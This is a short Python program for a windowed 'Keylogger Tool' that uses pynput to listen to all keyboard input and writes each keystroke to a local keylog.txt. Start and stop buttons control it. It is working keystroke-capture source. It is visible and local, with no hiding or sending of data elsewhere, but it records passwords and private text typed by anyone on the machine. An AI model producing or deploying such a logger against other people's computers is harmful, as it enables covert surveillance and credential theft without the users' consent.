import tkinter as tk
from tkinter import ttk, messagebox
from pynput import keyboard
import os


class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger Tool")

        self.log_file_path = "keylog.txt"
        self.logging_active = False

        self.create_widgets()

    def create_widgets(self):
        # Frame for buttons
        frame_buttons = ttk.Frame(self.root, padding="20")
        frame_buttons.pack(fill=tk.BOTH, expand=True)

        # Start Button
        self.button_start = ttk.Button(frame_buttons, text="Start Keylogger", command=self.start_keylogger)
        self.button_start.pack(side=tk.LEFT, padx=10, pady=10)

        # Stop Button
        self.button_stop = ttk.Button(frame_buttons, text="Stop Keylogger", command=self.stop_keylogger,
                                      state=tk.DISABLED)
        self.button_stop.pack(side=tk.LEFT, padx=10, pady=10)

        # Text Area for logging
        self.text_log = tk.Text(self.root, height=10, width=50)
        self.text_log.pack(padx=20, pady=(0, 20))

    def start_keylogger(self):
        if self.logging_active:
            messagebox.showwarning("Keylogger Warning", "Keylogger is already running.")
            return

        try:
            # Ensure the log file exists or create it
            if not os.path.exists(self.log_file_path):
                with open(self.log_file_path, 'w') as log_file:
                    log_file.write("Keylogger Started\n")

            # Start listening to keyboard events
            self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
            self.listener.start()

            # Update UI
            self.logging_active = True
            self.button_start.config(state=tk.DISABLED)
            self.button_stop.config(state=tk.NORMAL)
            self.text_log.insert(tk.END, "Keylogger started...\n")

        except Exception as e:
            messagebox.showerror("Keylogger Error", f"Failed to start keylogger: {str(e)}")

    def stop_keylogger(self):
        if self.logging_active:
            # Stop listener
            self.listener.stop()

            # Update UI
            self.logging_active = False
            self.button_start.config(state=tk.NORMAL)
            self.button_stop.config(state=tk.DISABLED)
            self.text_log.insert(tk.END, "Keylogger stopped.\n")
        else:
            messagebox.showwarning("Keylogger Warning", "Keylogger is not currently running.")

    def write_to_file(self, key):
        with open(self.log_file_path, 'a') as log_file:
            log_file.write(f'{key}\n')

    def on_press(self, key):
        try:
            self.write_to_file(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                self.write_to_file(' ')
            else:
                self.write_to_file(str(key))

    def on_release(self, key):
        if key == keyboard.Key.esc:
            # Stop listener
            return False


def main():
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()


if __name__ == "__main__":
    main()

